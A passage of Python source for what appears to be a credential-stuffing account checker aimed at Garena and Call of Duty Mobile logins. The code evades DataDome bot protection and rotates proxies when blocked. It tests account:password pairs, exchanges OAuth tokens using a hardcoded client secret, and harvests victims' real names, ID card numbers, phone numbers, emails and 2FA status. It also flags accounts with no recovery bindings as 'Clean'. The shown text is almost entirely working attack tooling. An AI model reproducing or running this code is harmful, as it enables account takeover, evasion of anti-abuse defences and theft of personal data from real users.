4TQB1fNaC_GCmw52cSPx7JdlP4JJkg43F8AXGcoQdGWmTLw_5aEH_glk2iFlH3UR6Q63h3a9CU6s6RcIDahxwRsx_GDmE-3yOuZ_aofpbq0gdZpfXf3lbRkUXPf52U-IMzWzFXTn23wzoauduqCFqomiuRr1lcInJQlZBk3n0gZRD_gA4MvKLChl8TAMbZfkqW56PIt1EAuKqFXzCfMtQa5fCdZ7NGrxhZ0iFedp446I9yP_GOjkNixwwLxSan4mmKLD9I4EZKves6_g4I0eFuFRep7MGKUrTbCc6CG4zB646VRJDN55PJqeJYA_H1yNQXOWfCyJHW3fK2G4u2CLbMyrHVw5ZCb_J2ScgqYRVKOUfGH31suG6mabkIonirhCf4qXfSUCwYeXL2L-Ka_EF28BSSO4tR6qnd8rHlZZvPQRrHuMuqthMkJxr7aW4GQUoewBYuQUienYbIIGv_Q86h2VA-kR_ibFE769ky5ALj2SPGBc_l0jSlhLGEO5ZX4UK_tVoREYH7Abn2pjhwnRGuvVGbTqb78yLLmhGSdgrIPAQLhkgoe-g9LSS0RoqNrrN3ffHDZ3mHIqI5MePIhmtI9ImH6mYk7tiqPvFLab6mvoTWTngVNe6bq51TxeHB1-Mnxe__4progZdJQndsIeSjyLkSGi2gDSH1tDCf3F4esSy-3YG1eZ3LG8pFbO9f3qS-lM0HQh2uKUa-Fa1ZvbHqXZkR46-_pIZpxai7QDm2EuwiR60p6e03FLIIn8DVM20KPsJp3KQlDhVP72sXewVMOVnedyiNT-XDhjJM7vqXetag8ctk9eXhKi3UTqj_PBK4mjQ-wSJ5REb2cwRW07jS_cxqcGTQOt7kgFHLoEWqFQ1qG2UJF2wjGR8MZ5oaUu6TTmQQBw1Pvu8qJEWTBMLcjTkP1VPse_YOuh_LggYMhZlPBLVnFRaOeMqV2Wd23ZAUxuwbjuY876AKFaUDS151nUdl8Asis9bN_ab7GNZ7OL3MaJ8vx7t6QerZUSuKY_ORWTw0Tlehb9VWmPNQRToNuZ6APk0ebEo2WHEdYewnKLwOvYG4ylIp12xYf2E1m1-3ajQHeUjGB__JpzADPIZsk654YNwPTyhINRDlSxOtCKKs0NOqM7i45ZLn9qDOjMIB-HQpKJsAxNFGCwGVqGd5X_ZOlotWW8jjZQ-57Wc3EiFqNM9aBB7FwBq6IeMOaqDNosY0EpLgJNUPC5zK8wX09BfqaUnsxE_Z-kYW639gJBIhyhCEbumEkV5-ZS4cXaO80n56XyMr8ZB4mSmTfYgg_n45xSvx07i1bZmfxT3YeQ8786d3lK3qMzlz828Og8L5-r7WqIQ5xAf00SBJ5aFuqXaunYMDUxMaF6Pku07heHKz66bAmdZL_6MYVbF3nfJhJWKrHIFa5yYK-KckQ2fwlpbKxitHDFrs0uUVSarjFrDS2cU8SDNUWMaT81waYXhX4FKV6fSjiJqIeiCKHHkkHHoAEkAAaVfZExm1sUvYickmv6w-hnpyhS1FOv4tFP2TcB1wuKhdpDuKKOxDMu4Qlps_ln88cYVUcrIyamgWr2hGwbho5T5_wuyaGD7LC63GV621TIxJ_P2TH5-dbtb26JF25CBGvu6bnJOXeRUBfUaJ9e2ZVs9iCvef0wvjQmGuHKOTfpTKhb6Mc2QV2wk7US-29PYUNS44_ivf272Acf2Zu4wtSedVWGEH0od9MiWEzdkW2n1pZK_zXPt-3cu3Jql7mF_yyRuKQfMfIMyiRnzIbnTKSOUxkRAnXPqP8tuDx--GUtMjwbnuK73qEB7oNcGCkrWIRifDskzeixKidgiNigmMrRjyqpTY5JzLm_ve5vVk-TyzAwmRwLvhANV4XxYjceRTau5XJLv3DjyxcbNZrzAv1KqMtwEdbCI3WJPkmnRe0vII9ipRgFJRZgX7qOOOHtJgKqv34suqJeJG9wRHujcmGr3ac1LhhWcfpDwWKgEPCvajN7o1XRFAt3JPPaXLclHCNZQD42O1-KieWNYscwhh0O1x8ozs5kx_JkmseBN3PH-VfehO38OgJnIh0EaHHjNxk25O04Y3pE46qOc3Xjrod7Z9zDA5EpjZZ2qP6-sYiGw0CDijEQ95w_EfF7EeZUwxGO1t0oIRp6XqrwG1D4FE_vTW84oJIW-jHPRUfK8HzGUyLJQWvsxxJgObltbdveTkynGZAarATYYprb6WEEULjJLjatZ2KTT3jJLBlAJ2RsbKLODGNgdoILt1gdxeyp-hBgOtPdINpbeTBXeK5uevKYM9z_jvctNj3m-dy03Xz6xKd0ZWT55Kobr1TyddHokG_lJDFFeZYjeHu9u7JWv2fYjpls1BAp8_paDg66fS6bJ_DjpMuqY1SchS0Ce0SmFuu9UcxGYVkeCox47zEMxFqTYNIfCVlIonJBu1SLs1_t4CgS1bLsbCrxCie6gnwYlj9x1NN-gwpzKTMowcH9mjJmEmhX_4s6f6tWU3CNNHZXESdtMqbZ8favw1y2_yQ8-gCoVF3iCMAJI5xCTyyWrM9Mir_DczIKoc4nGP4NWZ2ATyI01OB6Z2ZcbrndXeKsPUXqII8-OYwW3gJxGFOlOPFfq2CAldYjyzP9r5VLYbGQnelUtvE9GWSwfYYYPD_p3BAFs3GQ57ndvkxcTA8BtzXMdPucKaNmJIJi1IvbA4dnjAGqAyhlpeesEHHwG5hK7LAvMfbFtNiBjltzAPGjYwqxidr3bL-ANw08woJR8j9Tq7ENDXbqsi77YHI95srjtah_l4aiCT4zUvdT8e41Z3EsS2dCVG8MuPge5j93H7-Okcau8_-QwzeaW59wZfHfhlNOFgH177W0iFjnjSnA8UWZZ2KdIX9KbsgLUGBrN5U2WT4zjXuh9CbHvxGwpc2YpAKx-FCh1AJUTJzeHuphB7pUIni5ePV5KuCewwyEnXu5BaJbmR3g8YkoXbH9xjXnLy2KgS_OqBhyMt0xwwx7yBac7bPSCnVyZ2qduoGY9O3qZp7IvQ1QsW3ibNch33k8oAZLRjOS_UlfnPeVe3ALGIw2sZOY-06b3cGt9xTqDjDdrGBPuPGVF0y3YEHpVoK5K7KFTubDB_Y8rsdvWane0xkoDoF8M8gq_1E_Wr09TAndPx2lvKVoTLXPgQCH_eNzIds9Ec_I_SdiydIXmSVcv3w7PQyAtmhsK7Ga06gujlMHKri1zK1cDbPJdxeFHW7Bfwnn6Upbij9qHjF4mHYjgHn_zWVQxh4BBnkYsnBtapQOYEfO0MnX8eXhcidk5BeCTk4RC0fKSEp8-2DuDGPdpkHHtEKibkw64Mc41MJ4Tz1mAQKxaXbNa28snq1uonIzOi7P_mf5O6AEHfvN9ONc5oGg9wXcHsknNgICGEvnssQ8avliUyI9tkUxqrIyPn5aBdt2vQtDLKAucioT9bg',
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'ISkde2yWEsap_rca8kFx8KRU7KyOv16N2yKK8zLXVO1Y2Xa2i_akWInfmy~dIlJBLQcPaZq6tXXCwXC4FIo1dLi2ZUonhelNtFSZoyIsDdmX0uxT1InMizbY4~zZh3jJ',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '5.6.6'
    }
    data = '&'.join(
        f'{k}={urllib.parse.quote(str(v))}'
        for k, v in payload.items()
    )
    try:
        response = session.post(
            url,
            headers=headers,
            data=data,
            proxies=proxies_arg,
            timeout=8
        )
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

captcha = (
    b'<html', b'<!doctype', b'datadome',
    b'interstitial', b'captcha', b'robot', b'blocked'
)

def sniff(response):
    ct = response.headers.get('content-type', '').lower()
    if 'text/html' in ct:
        return True
    raw = response.content[:400].lower()
    for marker in captcha:
        if marker in raw:
            return True
    return False

def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_manager=None):
    all_403 = True
    saw_network_error = False
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in [
                'apple_state_key', 'datadome', 'sso_key',
                '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'
            ]:
                if cookie_name in current_cookies:
                    cookie_parts.append(
                        f'{cookie_name}={current_cookies[cookie_name]}'
                    )
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                "Host": "sso.garena.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": (
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
                ),
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": (
                    "https://sso.garena.com/universal/login?app_id=10100"
                    "&redirect_uri=https%3A%2F%2Faccount.garena.com%2F"
                    "&locale=en-PH"
                ),
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            _to = 20 if (proxy_manager and proxy_manager.ready()) else 8
            response = session.get(
                url,
                headers=headers,
                params=params,
                timeout=_to
            )
            if response.status_code == 403:
                if proxy_manager and proxy_manager.ready():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.next())
                else:
                    proxy_dict = (
                        dict(session.proxies)
                        if hasattr(session, 'proxies') and session.proxies
                        else None
                    )
                    fresh_dd = garner(session, proxies_arg=proxy_dict)
                    if fresh_dd:
                        datadome_manager.set_datadome(fresh_dd)
                        datadome_manager.set_session_datadome(session, fresh_dd)
                    else:
                        datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    continue
                all_403 = True
                break
            if response.status_code == 429:
                time.sleep(2)
                continue
            response.raise_for_status()
            if sniff(response):
                bad_dd = (
                    session.cookies.get('datadome')
                    or datadome_manager.get_datadome()
                )
                if bad_dd:
                    cookie_manager.ban(bad_dd)
                picked_ck = cookie_manager.pick()
                if picked_ck:
                    instill(session, picked_ck)
                    val = pluck(picked_ck)
                    if val:
                        datadome_manager.set_datadome(val)
                        datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = (
                        dict(session.proxies)
                        if hasattr(session, 'proxies') and session.proxies
                        else None
                    )
                    fresh_dd = garner(session, proxies_arg=proxy_dict)
                    if fresh_dd:
                        datadome_manager.set_datadome(fresh_dd)
                        datadome_manager.set_session_datadome(session, fresh_dd)
                if proxy_manager and proxy_manager.ready():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.next())
                all_403 = False
                if attempt < retries - 1:
                    continue
                return (None, None, None)
            try:
                data = response.json()
            except json.JSONDecodeError:
                all_403 = False
                if proxy_manager and proxy_manager.ready():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.next())
                if attempt < retries - 1:
                    continue
                return (None, None, None)
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
            if 'error' in data:
                err_code = data['error']
                if err_code == 'error_no_account':
                    return ('NO_ACCOUNT', None, new_datadome)
                elif err_code in (
                    'error_auth', 'error_user_ban', 'error_security_ban'
                ):
                    return ('ERROR_AUTH', err_code, new_datadome)
                else:
                    all_403 = False
                    if attempt < retries - 1:
                        continue
                    return (None, None, None)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                all_403 = False
                if attempt < retries - 1:
                    continue
                return (None, None, None)
            return (v1, v2, new_datadome)
        except requests.exceptions.ConnectionError:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.ready():
                session.proxies.clear()
                session.proxies.update(proxy_manager.next())
            if attempt < retries - 1:
                continue
        except requests.exceptions.Timeout:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.ready():
                session.proxies.clear()
                session.proxies.update(proxy_manager.next())
            if attempt < retries - 1:
                continue
        except requests.exceptions.ProxyError:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.ready():
                session.proxies.clear()
                session.proxies.update(proxy_manager.next())
            if attempt < retries - 1:
                continue
        except requests.exceptions.SSLError:
            all_403 = False
            saw_network_error = True
            if proxy_manager and proxy_manager.ready():
                session.proxies.clear()
                session.proxies.update(proxy_manager.next())
            if attempt < retries - 1:
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                continue
    if all_403:
        return ('IP_BLOCKED', None, None)
    if saw_network_error:
        return ('NETWORK_ERROR', None, None)
    return (None, None, None)

def admit(session, account, password, v1, v2):
    hashed = cipher(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(
                f'{cookie_name}={current_cookies[cookie_name]}'
            )
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': ua,
        'sec-ch-ua': chua,
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'X-Requested-With': 'com.garena.game.codm'
    }
    if cookie_header:
        headers['cookie'] = cookie_header
    tries = 3
    for attempt in range(tries):
        try:
            _to = 20
            response = session.get(
                url,
                headers=headers,
                params=params,
                timeout=_to
            )
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = (
                                cookie_str.split('=')[1]
                                .split(';')[0]
                                .strip()
                            )
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
            for k, v in login_cookies.items():
                if k in [
                    'sso_key', 'apple_state_key',
                    'datadome', 'ac_session', 'session_key'
                ]:
                    session.cookies.set(k, v, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < tries - 1:
                    time.sleep(0.5)
                    continue
                return None

            try:
                _sk_body = (
                    data.get('session_key')
                    or data.get('sessionKey')
                    or ''
                )
                if _sk_body:
                    session.cookies.set(
                        'session_key', _sk_body, domain='.garena.com'
                    )
            except Exception:
                pass

            sso_key = (
                login_cookies.get('sso_key')
                or response.cookies.get('sso_key')
            )
            if 'error' in data:
                error_msg = data['error']
                if error_msg in (
                    'ACCOUNT DOESNT EXIST',
                    'error_no_account',
                    'error_auth',
                    'error_user_ban',
                    'error_security_ban'
                ):
                    return f'permanent_fail:{error_msg}'
                if attempt < tries - 1:
                    time.sleep(2)
                    continue
                return None
            return sso_key
        except requests.RequestException:
            if attempt < tries - 1:
                time.sleep(0.5)
                continue
    return None

def identify():
    return f'02-{uuid.uuid4()}'

def grant(session):
    for attempt in range(retries):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in [
                'apple_state_key', 'fb_state', 'google_state',
                'huawei_state', 'line_state', 'twitter_state',
                'vk_state', 'tiktok_state', 'youtube_state',
                'sso_key', 'datadome'
            ]:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {
                'Host': '100082.connect.garena.com',
                'Connection': 'keep-alive',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': ua,
                'sec-ch-ua': chua,
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-mobile': '?1',
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://100082.connect.garena.com',
                'X-Requested-With': 'com.garena.game.codm',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': (
                    'https://100082.connect.garena.com/universal/oauth'
                    '?client_id=100082&locale=en-US&create_grant=true'
                    '&login_scenario=normal&redirect_uri=gop100082://auth/'
                    '&response_type=code'
                ),
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9'
            }
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = (
                f'client_id=100082&response_type=code'
                f'&redirect_uri=gop100082%3A%2F%2Fauth%2F'
                f'&create_grant=true&login_scenario=normal'
                f'&format=json&id={random_id}'
            )
            resp = session.post(
                grant_url,
                headers=grant_headers,
                data=grant_body,
                timeout=12
            )
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (
            requests.exceptions.ProxyError,
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout
        ):
            if attempt < retries - 1:
                gap = delay * 2 ** attempt
                time.sleep(gap)
                continue
            else:
                logger.error(
                    f'[ERROR] Error in grant after {retries} attempts'
                )
                raise
        except Exception:
            logger.error('[ERROR] Error in grant (token/grant)')
            return ''
    return ''

def swap(code, device_id=None, proxy_arg=None):
    if not device_id:
        device_id = identify()
    if proxy_arg is None:
        proxy_arg = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = (
        '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    )
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {
        'User-Agent': ua,
        'sec-ch-ua': chua,
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'X-Requested-With': 'com.garena.game.codm',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': '100082.connect.garena.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    exchange_body = (
        f'grant_type=authorization_code&code={code}'
        f'&device_id={urllib.parse.quote(device_id)}'
        f'&redirect_uri={urllib.parse.quote(REDIRECT_URI)}'
        f'&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    )
    for attempt in range(retries):
        try:
            resp = requests.post(
                exchange_url,
                headers=exchange_headers,
                data=exchange_body,
                timeout=12,
                proxies=proxy_arg
            )
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(
                    f'[ERROR] token/exchange returned no access_token: {data}'
                )
            return access_token
        except (
            requests.exceptions.ProxyError,
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout
        ):
            if attempt < retries - 1:
                gap = delay * 2 ** attempt
                time.sleep(gap)
                continue
            else:
                logger.error(
                    f'[ERROR] Error in swap after {retries} attempts'
                )
                raise
        except Exception:
            logger.error('[ERROR] Error in swap (token/exchange)')
            return ''
    return ''

def acquire_codm(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': ua,
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': (
                '"Not(A:Brand";v="8", "Chromium";v="144", '
                '"Android WebView";v="144"'
            ),
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': (
                'https://100082.connect.garena.com/universal/oauth'
                '?client_id=100082&locale=en-US&create_grant=true'
                '&login_scenario=normal&redirect_uri=gop100082://auth/'
                '&response_type=code'
            ),
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        device_id = identify()
        grant_data = (
            f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F'
            f'&response_type=code&id={random_id}'
        )
        grant_response = session.post(
            grant_url,
            headers=grant_headers,
            data=grant_data,
            timeout=15
        )
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        token_data = (
            f'grant_type=authorization_code&code={auth_code}'
            f'&device_id={device_id}'
            f'&redirect_uri=gop100082%3A%2F%2Fauth%2F'
            f'&source=2&client_id=100082'
            f'&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        )
        token_response = session.post(
            token_url,
            headers=token_headers,
            data=token_data,
            timeout=15
        )
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def callback(session, access_token, open_id=None, uid=None):
    try:
        old_url = (
            f'https://api-delete-request.codm.garena.co.id/'
            f'oauth/callback/?access_token={access_token}'
        )
        old_headers = {
            'accept': (
                'text/html,application/xhtml+xml,'
                'application/xml;q=0.9,*/*;q=0.8'
            ),
            'user-agent': (
                'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) '
                'AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36'
            ),
            'referer': 'https://auth.garena.com/'
        }
        old_response = session.get(
            old_url,
            headers=old_headers,
            allow_redirects=False,
            timeout=15
        )
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_url = (
            f'https://api-delete-request-aos.codm.garena.co.id/'
            f'oauth/callback/?access_token={access_token}'
        )
        aos_headers = {
            'accept': (
                'text/html,application/xhtml+xml,'
                'application/xml;q=0.9,*/*;q=0.8'
            ),
            'user-agent': (
                'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F '
                'Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 '
                '(KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 '
                'Mobile Safari/537.36'
            ),
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        aos_response = session.get(
            aos_url,
            headers=aos_headers,
            allow_redirects=False,
            timeout=15
        )
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def decode_token(session, token):
    try:
        try:
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {
                        'codm_nickname': user_data.get(
                            'codm_nickname',
                            user_data.get('nickname', 'N/A')
                        ),
                        'codm_level': user_data.get('codm_level', 'N/A'),
                        'region': user_data.get('region', 'N/A'),
                        'uid': user_data.get('uid', 'N/A'),
                        'open_id': user_data.get('open_id', 'N/A'),
                        't_open_id': user_data.get('t_open_id', 'N/A')
                    }
        except Exception:
            pass
        url = (
            'https://api-delete-request-aos.codm.garena.co.id/'
            'oauth/check_login/'
        )
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': (
                'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F '
                'Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 '
                '(KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 '
                'Mobile Safari/537.36'
            ),
            'x-requested-with': 'com.garena.game.codm'
        }
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        return {}
    except Exception:
        return {}

def inspect(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = acquire_codm(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = decode_token(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

def dissect(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(
            user_info.get('email_verify_available', False)
        ),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(
                user_info.get('is_fbconnect_enabled', False)
            ),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': (
                'Bound' if user_info.get('mobile_binding_status', 0)
                else 'Not Bound'
            ),
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': (
                'Active' if user_info.get('status', 0) == 1 else 'Inactive'
            ),
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(
                user_info.get('realinfo_updatable', False)
            )
        },
        'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid},
        'binds': [],
        'game_info': []
    }
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = (
        mobile_no == 'N/A'
        or not mobile_no
        or str(mobile_no).strip() == ''
    )
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if (
        email and email != 'N/A'
        and str(email).strip()
        and (not email.startswith('***'))
    ):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if (
        account_info['security']['facebook_connected']
        and fb_uid
        and (fb_uid != 'N/A')
    ):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = (
        'Clean' if is_clean
        else 'Not Clean' if account_info['binds']
        else 'Not Clean'
    )
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = (
        '[SUCCESS] Normal'
        if not security_indicators
        else ' | '.join(security_indicators)
    )
    return account_info

def reveal(
    account, password, details, codm_info, has_codm,
    error_reason=None, game_connections=None, is_elegant=False
):
    global active

    if details is None and not is_elegant:
        return

    with dashlock:
        if active:
            dash_str = active.render()
            dash_lines = dash_str.count('\n') + 1
            sys.stdout.write(f'\x1b[{dash_lines}A\x1b[0J')
            sys.stdout.flush()

        if details is None:
            if error_reason is None:
                error_reason = 'Incorrect Password'

            rprint(f"\n[dim]{'━' * 65}[/dim]")
            rprint(
                f"[bold bright_red]✖ INVALID HIT[/bold bright_red]  "
                f"[dim]│[/dim]  [bold white]{account}:{password}[/bold white]"
            )
            rprint(f"[dim]{'─' * 65}[/dim]")
            rprint(
                f" [dim]•[/dim] [cyan]Reason   :[/cyan] "
                f"[yellow]{error_reason}[/yellow]"
            )
            rprint(f"[dim]{'━' * 65}[/dim]\n")

            if active:
                sys.stdout.write(active.render() + '\n')
                sys.stdout.flush()
            return

        email = details.get('email', 'N/A')
